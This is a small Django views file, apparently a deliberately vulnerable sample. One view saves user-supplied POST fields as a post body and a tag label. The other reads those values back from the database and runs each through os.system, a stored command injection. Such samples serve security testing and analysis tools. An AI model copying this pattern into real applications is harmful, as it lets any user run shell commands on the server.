import os
from django.db import connection
from django.http import HttpResponse
from .models import Post, Tag

def write(request):
    Post.objects.create(body=request.POST["b"])
    Tag.objects.create(label=request.POST["l"])

def read(request):
    with connection.cursor() as cur:
        cur.execute("SELECT body FROM blog_post")
        r = cur.fetchone()
        os.system(r[0])
        cur.execute("SELECT label FROM custom_tags")
        os.system(cur.fetchone()[0])
    return HttpResponse("ok")
